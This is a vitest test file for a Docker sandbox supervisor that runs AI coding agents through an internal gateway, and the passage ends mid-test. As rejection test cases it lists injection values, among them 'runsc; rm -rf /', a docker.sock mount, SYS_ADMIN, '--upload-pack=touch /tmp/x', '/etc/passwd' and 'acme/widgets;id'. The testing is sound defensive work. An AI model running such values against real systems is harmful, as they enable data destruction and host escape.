import { execFileSync } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { Hono } from 'hono';
import { describe, expect, it } from 'vitest';

import { runProbe } from '../deployment/coding/egress-probe.mjs';
import {
    allocateSubnet,
    CODEX_OVERRIDES,
    containerSpec,
    createSandboxApi,
    demuxLogs,
    EGRESS_LABEL,
    execPlan,
    GATEWAY_URL,
    GEMINI_NO_MCP,
    GROK_HOME,
    HARNESSES,
    LABELS,
    mountCodingSandboxes,
    networkSpec,
    parseCreateRequest,
    probeVerdict,
    SANDBOX_TOOLS,
    sandboxConfig,
    sandboxNames,
    specMismatches,
    type SandboxConfig,
} from '../deployment/computers/coding-sandbox.mjs';
import { hardenSupervisorSandboxes } from '../deployment/computers/harden-supervisor.mjs';

// CB-239: the computer supervisor's fixed-spec sandbox API, against
// a fake Docker. Nothing here starts a container.

const NS = 'company-brain';
const IMAGE = `socio-coding@sha256:${'a'.repeat(64)}`;
const IMAGE_ID = 'sha256:image-id-1';
const KEY = 'b'.repeat(64);
const PROXY_USER = Buffer.from('{"s":"sess-1"}').toString('base64url');
const PROXY_PASSWORD = 'p'.repeat(43);
const IDENTITY = {
    name: 'Rulo (Socio)',
    email: 'socio-a1b2c3d4@users.noreply.apps.example.com',
};
const env = (change: Record<string, string | undefined> = {}) => ({
    CODING_SANDBOX_IMAGE: IMAGE,
    ...change,
});
const config = (change: Record<string, string | undefined> = {}) => sandboxConfig(env(change), NS);

/** Docker's defaults for an unprivileged container (moby oci/defaults.go; the list grows across versions). */
const DOCKER_MASKED_PATHS = [
    '/proc/asound',
    '/proc/acpi',
    '/proc/interrupts',
    '/proc/kcore',
    '/proc/keys',
    '/proc/latency_stats',
    '/proc/timer_list',
    '/proc/timer_stats',
    '/proc/sched_debug',
    '/proc/scsi',
    '/sys/firmware',
    '/sys/devices/virtual/powercap',
];
const DOCKER_READONLY_PATHS = ['/proc/bus', '/proc/fs', '/proc/irq', '/proc/sys', '/proc/sysrq-trigger'];

const dockerError = (statusCode: number, message = `status ${statusCode}`) =>
    Object.assign(new Error(message), { statusCode });

// The fake mirrors Docker's JSON loosely: only the fields the supervisor
// reads and writes.
// oxlint-disable-next-line typescript/no-explicit-any -- Docker JSON
type DockerJson = any;

type ExecResult = { stdout?: string; stderr?: string; exitCode: number };

/**
 * An in-memory Docker with the calls the supervisor makes. `tamper` edits
 * what `inspect` reports after a create (an engine that ignored a field);
 * `onExec` answers execs; `probe` is the canary's stdout and exit code.
 */
class FakeDocker {
    calls: string[] = [];
    containers = new Map<string, DockerJson>();
    networks = new Map<string, DockerJson>();
    volumes = new Map<string, DockerJson>();
    images = new Map<string, DockerJson>([[IMAGE, { Id: IMAGE_ID }]]);
    egress: DockerJson = {
        Id: 'egress-container-id',
        Labels: { [EGRESS_LABEL]: NS },
        State: 'running',
    };
    tamper?: (info: DockerJson) => void;
    probe: ExecResult = {
        stdout: '{"probe":"socio-egress-probe","v":1,"resolved":[],"reached":[],"tunnel":false}\n',
        exitCode: 0,
    };
    execs: Array<{ options: DockerJson; stdin: string }> = [];
    failExec = false;
    onExec: (options: DockerJson, stdin: string) => ExecResult | Promise<ExecResult> = () => ({
        stdout: 'ok',
        exitCode: 0,
    });

    modem = {
        demuxStream: (stream: DockerJson, out: DockerJson, err: DockerJson) => {
            stream.out = out;
            stream.err = err;
        },
    };

    private matches(labels: Record<string, string> | undefined, filters: DockerJson) {
        return (filters?.label ?? []).every((rule: string) => {
            const [key, value] = rule.split('=');
            return value === undefined ? key in (labels ?? {}) : labels?.[key] === value;
        });
    }

    async listContainers({ filters }: DockerJson) {
        this.calls.push('listContainers');
        const all = [
            ...(this.egress ? [this.egress] : []),
            ...[...this.containers.values()].map((entry) => ({
                Id: entry.info.Id,
                Labels: entry.info.Config.Labels,
                State: entry.info.State.Running ? 'running' : 'created',
                Created: 1_800_000_000,
            })),
        ];
        return all.filter(
            (entry) =>
                this.matches(entry.Labels, filters) && (!filters?.status || filters.status.includes(entry.State)),
        );
    }

    async listNetworks({ filters }: DockerJson) {
        return [...this.networks.values()]
            .filter((network) => this.matches(network.Labels, filters))
            .map((network) => structuredClone(network));
    }

    async createVolume({ Name, Labels }: DockerJson) {
        this.calls.push(`createVolume ${Name}`);
        if (this.volumes.has(Name)) {
            throw dockerError(409);
        }
        this.volumes.set(Name, { Name, Labels });
    }

    getVolume(name: string) {
        return {
            inspect: async () => {
                const volume = this.volumes.get(name);
                if (!volume) {
                    throw dockerError(404);
                }
                return structuredClone(volume);
            },
            remove: async () => {
                this.calls.push(`removeVolume ${name}`);
                if (!this.volumes.delete(name)) {
                    throw dockerError(404);
                }
            },
        };
    }

    async createNetwork(spec: DockerJson) {
        this.calls.push(`createNetwork ${spec.Name}`);
        if (this.networks.has(spec.Name)) {
            throw dockerError(409);
        }
        const subnet = spec.IPAM.Config[0].Subnet;
        for (const network of this.networks.values()) {
            if (network.IPAM.Config[0].Subnet === subnet) {
                throw dockerError(403, 'Pool overlaps with other one on this address space');
            }
        }
        this.networks.set(spec.Name, {
            Name: spec.Name,
            Driver: spec.Driver,
            Internal: spec.Internal,
            EnableIPv6: spec.EnableIPv6,
            Attachable: spec.Attachable,
            IPAM: {
                Config: [
                    {
                        Subnet: subnet,
                        Gateway: subnet.replace(/\.\d+\/28$/, (m: string) => `.${Number(m.slice(1, -3)) + 1}`),
                    },
                ],
            },
            Labels: spec.Labels,
            Options: spec.Options,
            Containers: {},
        });
    }

    getNetwork(name: string) {
        return {
            inspect: async () => {
                const network = this.networks.get(name);
                if (!network) {
                    throw dockerError(404);
                }
                return structuredClone(network);
            },
            connect: async ({ Container }: DockerJson) => {
                this.calls.push(`connect ${name} ${Container}`);
                const network = this.networks.get(name);
                const [base] = network.IPAM.Config[0].Subnet.split('/');
                const parts = base.split('.').map(Number);
                parts[3] += 2 + Object.keys(network.Containers).length;
                network.Containers[Container] = {
                    IPv4Address: `${parts.join('.')}/28`,
                };
            },
            disconnect: async ({ Container }: DockerJson) => {
                this.calls.push(`disconnect ${name} ${Container}`);
                const network = this.networks.get(name);
                if (!network) {
                    throw dockerError(404);
                }
                delete network.Containers[Container];
            },
            remove: async () => {
                this.calls.push(`removeNetwork ${name}`);
                if (!this.networks.delete(name)) {
                    throw dockerError(404);
                }
            },
        };
    }

    getImage(ref: string) {
        return {
            inspect: async () => {
                const image = this.images.get(ref);
                if (!image) {
                    throw dockerError(404);
                }
                return image;
            },
        };
    }

    async createContainer(spec: DockerJson) {
        this.calls.push(`createContainer ${spec.name}`);
        if (this.containers.has(spec.name)) {
            throw dockerError(409);
        }
        const info: DockerJson = {
            Id: `id-${spec.name}`,
            Name: `/${spec.name}`,
            Image: this.images.get(spec.Image)?.Id,
            Config: {
                Image: spec.Image,
                User: spec.User,
                Entrypoint: spec.Entrypoint,
                Cmd: spec.Cmd,
                Env: spec.Env,
                Labels: spec.Labels,
                ExposedPorts: spec.ExposedPorts,
            },
            HostConfig: {
                // Docker fills its default masked and read-only /proc and /sys
                // paths when a create names none.
                MaskedPaths: [...DOCKER_MASKED_PATHS],
                ReadonlyPaths: [...DOCKER_READONLY_PATHS],
                ...structuredClone(spec.HostConfig),
            },
            Mounts: spec.HostConfig.Mounts.map((mount: DockerJson) => ({
                Type: mount.Type,
                Name: mount.Source,
                Destination: mount.Target,
            })),
            NetworkSettings: { Networks: {} },
            State: { Running: false },
        };
        this.tamper?.(info);
        this.containers.set(spec.name, { spec, info });
    }

    getContainer(name: string) {
        const entry = () => {
            const found = this.containers.get(name);
            if (!found) {
                throw dockerError(404);
            }
            return found;
        };
        return {
            inspect: async () => structuredClone(entry().info),
            start: async () => {
                this.calls.push(`start ${name}`);
                const found = entry();
                found.info.State.Running = true;
                found.info.NetworkSettings.Networks = {
                    [found.info.HostConfig.NetworkMode]: {},
                };
            },
            remove: async () => {
                this.calls.push(`removeContainer ${name}`);
                entry();
                this.containers.delete(name);
            },
            wait: async () => ({ StatusCode: this.probe.exitCode }),
            logs: async () => {
                const text = Buffer.from(this.probe.stdout ?? '');
                const header = Buffer.alloc(8);
                header[0] = 1;
                header.writeUInt32BE(text.length, 4);
                return Buffer.concat([header, text]);
            },
            exec: async (options: DockerJson) => {
                entry();
                if (this.failExec) {
                    throw dockerError(500, 'exec failed');
                }
                const stream: DockerJson = new EventEmitter();
                let stdin = '';
                let result: ExecResult = { exitCode: -1 };
                const run = async () => {
                    this.execs.push({ options, stdin });
                    result = await this.onExec(options, stdin);
                    if (result.stdout) {
                        stream.out.write(Buffer.from(result.stdout));
                    }
                    if (result.stderr) {
                        stream.err.write(Buffer.from(result.stderr));
                    }
                    stream.emit('end');
                };
                stream.write = (chunk: string) => {
                    stdin += chunk;
                    return true;
                };
                stream.end = () => void run();
                return {
                    start: async () => {
                        if (!options.AttachStdin) {
                            setImmediate(() => void run());
                        }
                        return stream;
                    },
                    inspect: async () => ({ ExitCode: result.exitCode }),
                };
            },
        };
    }
}

async function ready(change: Record<string, string | undefined> = {}) {
    const docker = new FakeDocker();
    const logs: string[] = [];
    const api = createSandboxApi({
        docker,
        config: config(change),
        log: (line) => logs.push(line),
    });
    return { docker, api, logs };
}

async function created(change: Record<string, string | undefined> = {}) {
    const setup = await ready(change);
    const answer = await setup.api.handle('POST', '/sandboxes', {
        sessionId: 'sess-1',
        volumeKey: KEY,
    });
    expect(answer.status).toBe(201);
    return { ...setup, answer };
}

async function started() {
    const setup = await created();
    const answer = await setup.api.handle('POST', '/sandboxes/sess-1/start', {
        proxyUser: PROXY_USER,
        proxyPassword: PROXY_PASSWORD,
    });
    expect(answer).toEqual({
        status: 200,
        body: { sessionId: 'sess-1', state: 'running' },
    });
    return setup;
}

const promptParams = (change: Record<string, unknown> = {}) => ({
    session: 'ses_01J9ABCDEF',
    model: 'qwen38',
    prompt: 'Rename the helper and run the tests.',
    identity: IDENTITY,
    ...change,
});

describe('configuration', () => {
    it('stays off without a digest-pinned image, a private pool or the built mode', () => {
        for (const [change, reason] of [
            [{ CODING_SANDBOX_IMAGE: undefined }, /not set/],
            [{ CODING_SANDBOX_IMAGE: 'socio-coding:latest' }, /pinned by digest/],
            [{ CODING_SANDBOX_IMAGE: 'socio-coding@sha256:abc' }, /pinned by digest/],
            [{ CODING_SANDBOX_IMAGE: 'sha256:abc' }, /local image ID/],
            [{ CODING_SANDBOX_IMAGE: `${'a'.repeat(64)}` }, /local image ID/],
            [{ CODING_SANDBOX_SUBNETS: '8.8.0.0/16' }, /private/],
            [{ CODING_SANDBOX_SUBNETS: '10.0.0.0/30' }, /private/],
            [{ CODING_EGRESS_MODE: 'intercept' }, /not built/],
            [{ CODING_SANDBOX_MAX_CPUS: 'lots' }, /CPUS/],
            [{ COMPUTER_RUNTIME: 'runsc; rm -rf /' }, /runtime/],
        ] as const) {
            const result = config(change);
            expect(result.enabled, JSON.stringify(change)).toBe(false);
            expect(result.reason).toMatch(reason);
        }
        expect(config()).toMatchObject({
            enabled: true,
            mode: 'virtual-hosts',
            ceilings: {
                cpus: 2,
                memoryBytes: 4 * 1024 ** 3,
                pids: 512,
                sandboxes: 8,
            },
        });
        expect(config({ COMPUTER_RUNTIME: 'runsc' }).runtime).toBe('runsc');
    });

    it('refuses every route but the self-test while off, without touching Docker', async () => {
        const docker = new FakeDocker();
        const api = createSandboxApi({
            docker,
            config: config({ CODING_SANDBOX_IMAGE: undefined }),
            log: () => {},
        });
        const answer = await api.handle('POST', '/sandboxes', {
            sessionId: 's',
            volumeKey: KEY,
        });
        expect(answer.status).toBe(503);
        expect(answer.body.error).toMatch(/off: CODING_SANDBOX_IMAGE/);
        expect((await api.handle('POST', '/sandboxes/self-test')).body).toMatchObject({ ok: false });
        expect(docker.calls).toEqual([]);
    });
});

describe('requests carry no spec', () => {
    it('refuses an image, mount, capability, command or any other field', async () => {
        const { api, docker } = await ready();
        for (const extra of [
            { image: 'alpine' },
            { Image: 'alpine' },
            { mounts: ['/:/host'] },
            { Binds: ['/var/run/docker.sock:/var/run/docker.sock'] },
            { capAdd: ['SYS_ADMIN'] },
            { privileged: true },
            { cmd: ['sh', '-c', 'id'] },
            { entrypoint: 'sh' },
            { network: 'host' },
            { env: ['HTTP_PROXY='] },
            { user: 'root' },
        ]) {
            const answer = await api.handle('POST', '/sandboxes', {
                sessionId: 'sess-1',
                volumeKey: KEY,
                ...extra,
            });
            expect(answer.status, JSON.stringify(extra)).toBe(400);
            expect(answer.body.error).toMatch(/is not accepted/);
        }
        for (const body of [
            { sessionId: '../etc', volumeKey: KEY },
            { sessionId: '-rm', volumeKey: KEY },
            { sessionId: 'selftest', volumeKey: KEY },
            { sessionId: 'x'.repeat(65), volumeKey: KEY },
            { sessionId: 'sess-1', volumeKey: 'B'.repeat(64) },
            { sessionId: 'sess-1', volumeKey: '../../x' },
            { sessionId: 'sess-1', volumeKey: KEY, cpus: '2' },
            [],
            'text',
        ]) {
            expect((await api.handle('POST', '/sandboxes', body)).status, JSON.stringify(body)).toBe(400);
        }
        for (const body of [
            { proxyUser: PROXY_USER, proxyPassword: PROXY_PASSWORD, image: 'x' },
            { proxyUser: 'a b', proxyPassword: PROXY_PASSWORD },
            { proxyUser: PROXY_USER, proxyPassword: 'short' },
            { proxyUser: `${PROXY_USER}@evil:1/`, proxyPassword: PROXY_PASSWORD },
        ]) {
            expect((await api.handle('POST', '/sandboxes/sess-1/start', body)).status).toBe(400);
        }
        expect(docker.calls.filter((call) => /create|start|connect/.test(call))).toEqual([]);
    });

    it('clamps resource numbers to the supervisor’s ceilings', () => {
        const limits = config({
            CODING_SANDBOX_MAX_MEMORY_BYTES: String(2 * 1024 ** 3),
        });
        const parsed = parseCreateRequest(
            { sessionId: 's1', volumeKey: KEY, cpus: 64, memoryBytes: 1e15, pids: 3 },
            limits,
        );
        expect(parsed).toEqual({
            ok: true,
            value: {
                sessionId: 's1',
                volumeKey: KEY,
                cpus: 2,
                memoryBytes: 2 * 1024 ** 3,
                pids: 64,
            },
        });
        expect(parseCreateRequest({ sessionId: 's1', volumeKey: KEY }, limits)).toMatchObject({
            value: { cpus: 2, memoryBytes: 2 * 1024 ** 3, pids: 512 },
        });
    });

    it('takes execs only from the fixed set, with no shell and the prompt on stdin', () => {
        const limits = config();
        for (const [kind, params] of [
            ['shell', { command: 'id' }],
            ['bash', {}],
            ['exec', { argv: ['sh', '-c', 'id'] }],
            ['status', { argv: ['id'] }],
            ['prompt', promptParams({ env: ['X=1'] })],
            ['prompt', promptParams({ session: '--server=http://x' })],
            ['prompt', promptParams({ model: 'm --agent x' })],
            ['prompt', promptParams({ prompt: '' })],
            ['prompt', promptParams({ prompt: 'x'.repeat(256 * 1024 + 1) })],
            [
                'prompt',
                promptParams({
                    identity: { name: 'Ada Example', email: 'ada@example.com' },
                }),
            ],
            [
                'prompt',
                promptParams({
                    identity: { name: 'Rulo (Socio)', email: 'rulo@example.com' },
                }),
            ],
            [
                'setup',
                {
                    repository: 'acme/widgets;id',
                    base: 'main',
                    branch: 'socio/rulo/a1b2',
                    identity: IDENTITY,
                },
            ],
            [
                'setup',
                {
                    repository: 'acme/../etc',
                    base: 'main',
                    branch: 'socio/rulo/a1b2',
                    identity: IDENTITY,
                },
            ],
            [
                'setup',
                {
                    repository: 'acme/widgets',
                    base: '--upload-pack=touch /tmp/x',
                    branch: 'socio/rulo/a1b2',
                    identity: IDENTITY,
                },
            ],
            [
                'setup',
                {
                    repository: 'acme/widgets',
                    base: 'main',
                    branch: 'socio/../main',
                    identity: IDENTITY,
                },
            ],
            [
                'setup',
                {
                    repository: 'acme/widgets',
                    base: 'main@{1}',
                    branch: 'socio/rulo/a1b2',
                    identity: IDENTITY,
                },
            ],
            ['diff', { base: 'main', path: '-p' }],
            ['diff', { base: 'main', path: '../outside' }],
            ['diff', { base: 'main', path: ':(top)x' }],
            ['diff', { base: 'main', path: '.git/config' }],
            ['diff', { base: 'main', path: '/etc/passwd' }],
            ['token', { token: 'cbsa_' + 'x'.repeat(43) }],
            ['token', { token: 'cbgw_short' }],
        ] as const) {
            const plan = execPlan(kind, params, limits);
            expect(plan.ok, `${kind} ${JSON.stringify(params).slice(0, 80)}`).toBe(false);
        }
        const prompt = execPlan('prompt', promptParams(), limits);
        if (!prompt.ok) {
            throw new Error(prompt.reason);
        }
        expect(prompt.value.argv).toEqual([
            'timeout',
            '-k',
            '10s',
            '1200s',
            'opencode',
            'run',
            '--standalone',
            '--format',
            'json',
            '--session',
            'ses_01J9ABCDEF',
            '--model',
            'socio/qwen38',
            '--auto',
        ]);
        expect(prompt.value.argv).not.toContain('serve');
        expect(prompt.value.stdin).toBe('Rename the helper and run the tests.');
        expect(prompt.value.argv.join(' ')).not.toContain('Rename');
        expect(prompt.value.env.join(' ')).not.toContain('Rename');
        expect(prompt.value.env).toContain('GIT_AUTHOR_NAME=Rulo (Socio)');
        expect(prompt.value.env).toContain(`GIT_COMMITTER_EMAIL=${IDENTITY.email}`);
        const content = prompt.value.env.find((entry) => entry.startsWith('OPENCODE_CONFIG_CONTENT='));
        expect(JSON.parse(content!.split('=').slice(1).join('='))).toEqual({
            model: 'socio/qwen38',
            providers: { socio: { models: { qwen38: { name: 'qwen38' } } } },
        });
        // A session on the person's own plan: the Responses provider,
        // still only the gateway; any other API is refused.
        const responses = execPlan('prompt', promptParams({ model: 'personal-chatgpt', api: 'responses' }), limits);
        if (!responses.ok) {
            throw new Error(responses.reason);
        }
        expect(responses.value.argv).toContain('socio-responses/personal-chatgpt');
        const plan = responses.value.env.find((entry) => entry.startsWith('OPENCODE_CONFIG_CONTENT='));
        expect(JSON.parse(plan!.split('=').slice(1).join('='))).toEqual({
            model: 'socio-responses/personal-chatgpt',
            providers: {
                'socio-responses': {
                    models: { 'personal-chatgpt': { name: 'personal-chatgpt' } },
                },
            },
        });
        for (const api of ['messages', 'anthropic', '', 1]) {
            expect(execPlan('prompt', promptParams({ api }), limits).ok, String(api)).toBe(false);
        }
        // Longer prompts are clamped to the supervisor's ceiling.
        const long = execPlan('prompt', promptParams({ seconds: 99_999 }), limits);
        expect(long.ok && long.value.argv[3]).toBe('1200s');
        // Socio's own Git commands never run planted hooks or drivers.
        for (const kind of ['status', 'diff', 'changes'] as const) {
            const plan = execPlan(kind, kind === 'status' ? {} : { base: 'main' }, limits);
            if (!plan.ok) {
                throw new Error(plan.reason);
            }
            const argv = plan.value.argv.join(' ');
            expect(argv).toContain('-c core.hooksPath=/dev/null');
            expect(argv).toContain('-c core.fsmonitor=false');
            expect(argv).toContain('-c core.pager=cat');
            if (kind !== 'status') {
                expect(argv).toContain('--no-ext-diff');
                expect(argv).toContain('--no-textconv');
                expect(plan.value.env).toContain('GIT_LITERAL_PATHSPECS=1');
            }
        }
        const diff = execPlan('diff', { base: 'main', path: 'src/a b.ts' }, limits);
        expect(diff.ok && diff.value.argv.slice(-2)).toEqual(['--', 'src/a b.ts']);
        const setup = execPlan(
            'setup',
            {
                repository: 'acme/widgets',
                base: 'main',
                branch: 'socio/rulo/a1b2',
                identity: IDENTITY,
            },
            limits,
        );
        expect(setup.ok && setup.value.argv.slice(4)).toEqual([
            '/usr/local/lib/socio/setup',
            'acme/widgets',
            'main',
            'socio/rulo/a1b2',
        ]);
        const token = execPlan('token', { token: `cbgw_${'t'.repeat(43)}` }, limits);
        expect(token.ok && token.value.argv.slice(4)).toEqual(['/usr/local/lib/socio/write-token']);
        expect(token.ok && token.value.stdin).toBe(`cbgw_${'t'.repeat(43)}`);
        for (const kind of ['token', 'setup', 'prompt', 'status', 'diff', 'changes'] as const) {
            const params =
                kind === 'token'
                    ? { token: `cbgw_${'t'.repeat(43)}` }
                    : kind === 'setup'
                      ? {
                            repository: 'acme/widgets',
                            base: 'main',
                            branch: 'socio/rulo/a1b2',
                            identity: IDENTITY,
                        }
                      : kind === 'prompt'
                        ? promptParams()
                        : kind === 'status'
                          ? {}
                          : { base: 'main' };
            const plan = execPlan(kind, params, limits);
            if (!plan.ok) {
                throw new Error(plan.reason);
            }
            expect(plan.value.argv[0]).toBe('timeout');
            expect(plan.value.argv).not.toContain('sh');
            expect(plan.value.argv).not.toContain('-lc');
        }
    });
});

describe('the coding agents a prompt may run (CB-326)', () => {
    const limits = config();
    const THREAD = '0199a213-81c0-7800-8aa1-bbab2a035a53';
    const plan = (change: Record<string, unknown>) => {
        const made = execPlan('prompt', promptParams(change), limits);
        if (!made.ok) {
            throw new Error(made.reason);
        }
        return made.value;
    };

    it('runs OpenCode when no harness is named, as before, and takes it by name too', () => {
        expect(HARNESSES).toEqual(['opencode', 'codex', 'claude-code', 'gemini-cli', 'grok']);
        expect(plan({ harness: 'opencode' })).toEqual(plan({}));
        expect(plan({}).argv.slice(4, 6)).toEqual(['opencode', 'run']);
    });

    it('refuses a harness outside the allowlist, a session that isn’t the harness’s, and api for others', () => {
        for (const change of [
            { harness: 'aider' },
            { harness: 'Codex' },
            { harness: 'gemini' },
            { harness: 'gemini-cli', session: 'latest' },
            { harness: 'gemini-cli', session: '1' },
            { harness: 'grok', session: 'my title' },
            { harness: 'grok', api: 'chat' },
            { harness: 'gemini-cli', api: 'responses' },
            { harness: 'grok', model: '-m x' },
            { harness: 'grok', model: 'a"b' },
            { harness: '' },
            { harness: ['codex'] },
            { harness: 'codex', session: '--last' },
            { harness: 'codex', session: 'ses_01J9ABCDEF' },
            { harness: 'claude-code', session: `${THREAD} --x` },
            { harness: 'claude-code', session: '' },
            { harness: 'codex', api: 'responses' },
            { harness: 'claude-code', api: 'chat' },
            { harness: 'codex', model: '-c model_provider=x' },
            // OpenCode still needs its session.
            { harness: 'opencode', session: undefined },
        ]) {
            expect(execPlan('prompt', promptParams(change), limits).ok, JSON.stringify(change)).toBe(false);
        }
    });

    it('runs codex exec through the gateway only, with its token from the file, the prompt on stdin', () => {
        const fresh = plan({ harness: 'codex', session: undefined });
        const overrides = CODEX_OVERRIDES.flatMap((value) => ['-c', value]);
        expect(fresh.argv).toEqual([
            'timeout',
            '-k',
            '10s',
            '1200s',
            `${SANDBOX_TOOLS}/with-token`,
            'SOCIO_GATEWAY_TOKEN',
            'codex',
            'exec',
            '--json',
            '--color',
            'never',
            '--skip-git-repo-check',
            '--dangerously-bypass-approvals-and-sandbox',
            '--model',
            'qwen38',
            ...overrides,
            '-',
        ]);
        expect(CODEX_OVERRIDES).toEqual(
            expect.arrayContaining([
                'model_provider="socio"',
                `model_providers.socio.base_url="${GATEWAY_URL}/v1"`,
                'model_providers.socio.env_key="SOCIO_GATEWAY_TOKEN"',
                'model_providers.socio.wire_api="responses"',
                'model_providers.socio.requires_openai_auth=false',
                'approval_policy="never"',
                'check_for_update_on_startup=false',
                'web_search="disabled"',
            ]),
        );
        expect(GATEWAY_URL).toBe('http://gateway.socio.internal');
        // No OpenAI host, login or key anywhere; the token isn't in argv or env.
        const all = [...fresh.argv, ...fresh.env].join(' ');
        expect(all).not.toMatch(/openai\.com|chatgpt\.com|OPENAI_API_KEY|cbgw_|login/);
        expect(fresh.stdin).toBe('Rename the helper and run the tests.');
        expect(all).not.toContain('Rename');
        expect(fresh.workdir).toBe('/work/repo');
        expect(fresh.env).toContain('GIT_AUTHOR_NAME=Rulo (Socio)');
        // The next prompt resumes the thread its output named.
        const resumed = plan({ harness: 'codex', session: THREAD });
        expect(resumed.argv.slice(-3)).toEqual(['resume', THREAD, '-']);
    });

    it('runs claude -p at the gateway’s Messages endpoint with telemetry, updates and betas off', () => {
        const fresh = plan({ harness: 'claude-code', session: undefined });
        expect(fresh.argv).toEqual([
            'timeout',
            '-k',
            '10s',
            '1200s',
            `${SANDBOX_TOOLS}/with-token`,
            'ANTHROPIC_AUTH_TOKEN',
            'claude',
            '-p',
            '--output-format',
            'stream-json',
            '--verbose',
            '--model',
            'qwen38',
            '--permission-mode',
            'bypassPermissions',
            '--strict-mcp-config',
            '--disallowedTools',
            'WebFetch',
            'WebSearch',
        ]);
        expect(fresh.env).toEqual(
            expect.arrayContaining([
                'ANTHROPIC_BASE_URL=http://gateway.socio.internal',
                'ANTHROPIC_MODEL=qwen38',
                'ANTHROPIC_DEFAULT_HAIKU_MODEL=qwen38',
                'ANTHROPIC_SMALL_FAST_MODEL=qwen38',
                'CLAUDE_CODE_SUBAGENT_MODEL=qwen38',
                'CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1',
                'DISABLE_AUTOUPDATER=1',
                'DISABLE_TELEMETRY=1',
                'DISABLE_ERROR_REPORTING=1',
                'CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS=1',
                'GIT_AUTHOR_NAME=Rulo (Socio)',
            ]),
        );
        const all = [...fresh.argv, ...fresh.env].join(' ');
        expect(all).not.toMatch(/anthropic\.com|claude\.ai|ANTHROPIC_API_KEY=|cbgw_|dangerously/);
        expect(fresh.stdin).toBe('Rename the helper and run the tests.');
        expect(all).not.toContain('Rename');
        expect(plan({ harness: 'claude-code', session: THREAD }).argv.slice(-2)).toEqual(['--resume', THREAD]);
    });

    it('runs gemini headless at the gateway’s Gemini API, with its key from the file and no MCP (CB-326)', () => {
        const fresh = plan({ harness: 'gemini-cli', session: undefined });
        expect(fresh.argv).toEqual([
            'timeout',
            '-k',
            '10s',
            '1200s',
            `${SANDBOX_TOOLS}/with-token`,
            'GEMINI_API_KEY',
            'gemini',
            '--output-format',
            'stream-json',
            '--model',
            'qwen38',
            '--approval-mode',
            'yolo',
            '--allowed-mcp-server-names',
            GEMINI_NO_MCP,
        ]);
        expect(fresh.env).toEqual(
            expect.arrayContaining([
                'GOOGLE_GEMINI_BASE_URL=http://gateway.socio.internal',
                'GEMINI_MODEL=qwen38',
                'SOCIO_GEMINI_MODEL=qwen38',
                'GEMINI_CLI_SYSTEM_SETTINGS_PATH=/etc/gemini-cli/settings.json',
                'GEMINI_CLI_TRUST_WORKSPACE=true',
                'GEMINI_CLI_NO_RELAUNCH=true',
                'GEMINI_TELEMETRY_ENABLED=false',
                'GIT_AUTHOR_NAME=Rulo (Socio)',
            ]),
        );
        const all = [...fresh.argv, ...fresh.env].join(' ');
        expect(all).not.toMatch(/googleapis\.com|google\.com|GEMINI_API_KEY=|GOOGLE_API_KEY|cbgw_|GOOGLE_GENAI_USE/);
        expect(fresh.stdin).toBe('Rename the helper and run the tests.');
        expect(all).not.toContain('Rename');
        expect(plan({ harness: 'gemini-cli', session: THREAD }).argv.slice(-2)).toEqual(['--resume', THREAD]);
    });

    it('runs grok headless through grok-socio, the prompt from stdin, web search and updates off (CB-326)', () => {
        const fresh = plan({ harness: 'grok', session: undefined });
        expect(fresh.argv).toEqual([
            'timeout',
            '-k',
            '10s',
            '1200s',
            `${SANDBOX_TOOLS}/with-token`,
            'SOCIO_GATEWAY_TOKEN',
            `${SANDBOX_TOOLS}/grok-socio`,
            'qwen38',
            '--output-format',
            'streaming-json',
            '--prompt-file',
            '/dev/stdin',
            '--model',
            'socio',
            '--yolo',
            '--disable-web-search',
            '--no-auto-update',
        ]);
        expect(fresh.env).toEqual(
            expect.arrayContaining([
                `GROK_HOME=${GROK_HOME}`,
                'GROK_DISABLE_AUTOUPDATER=1',
                'GROK_MEMORY=0',
                'GROK_FEEDBACK_ENABLED=false',
                'GIT_AUTHOR_NAME=Rulo (Socio)',
            ]),
        );
        expect(GROK_HOME.startsWith('/tmp/home/')).toBe(true);
        const all = [...fresh.argv, ...fresh.env].join(' ');
        expect(all).not.toMatch(/x\.ai|grok\.com|XAI_API_KEY|cbgw_/);
        expect(fresh.stdin).toBe('Rename the helper and run the tests.');
        expect(all).not.toContain('Rename');
        expect(plan({ harness: 'grok', session: THREAD }).argv.slice(-2)).toEqual(['--resume', THREAD]);
    });

    it('starts a harness only through with-token, which names one variable and one agent', () => {
        const script = readFileSync(join(import.meta.dirname, '..', 'deployment/coding/with-token'), 'utf8');
        expect(script).toMatch(/^set -eu$/m);
        expect(script).toContain('SOCIO_GATEWAY_TOKEN|ANTHROPIC_AUTH_TOKEN|GEMINI_API_KEY) ;;');
        expect(script).toContain('codex|claude|gemini|/usr/local/lib/socio/grok-socio) ;;');
        expect(script).toContain('token=$(cat /run/socio/token)');
        expect(script).not.toMatch(/\beval\b/);
    });
});

describe('diffs the person reads', () => {
    it('shows content however the workspace marks files binary', () => {
        const dir = mkdtempSync(join(tmpdir(), 'socio-g-g-'));
        try {
            const repo = join(dir, 'repo');
            const home = join(dir, 'home');
            mkdirSync(join(home, '.config', 'git'), { recursive: true });
            // Every place the workspace or the agent could plant `-diff`.
            writeFileSync(join(home, '.config', 'git', 'attributes'), '* -diff\n');
            writeFileSync(join(home, '.gitconfig'), `[core]\n\tattributesFile = ${join(home, 'planted')}\n`);
            writeFileSync(join(home, 'planted'), '* -diff\n');
            const env = {
                PATH: process.env.PATH,
                HOME: home,
                XDG_CONFIG_HOME: join(home, '.config'),
                GIT_CONFIG_NOSYSTEM: '1',
                GIT_AUTHOR_NAME: IDENTITY.name,
                GIT_AUTHOR_EMAIL: IDENTITY.email,
                GIT_COMMITTER_NAME: IDENTITY.name,
                GIT_COMMITTER_EMAIL: IDENTITY.email,
            };
            const git = (...args: string[]) => execFileSync('git', ['-C', repo, ...args], { env }).toString('utf8');
            mkdirSync(repo);
            git('init', '-q', '-b', 'main');
            writeFileSync(join(repo, 'a.txt'), 'before\n');
            git('add', 'a.txt');
            git('commit', '-q', '-m', 'base');
            git('update-ref', 'refs/remotes/origin/main', 'HEAD');
            writeFileSync(join(repo, 'a.txt'), 'exfiltrated-looking change\n');
            writeFileSync(join(repo, '.gitattributes'), '* -diff\n');
            git('add', 'a.txt', '.gitattributes');
            git('commit', '-q', '-m', 'change');
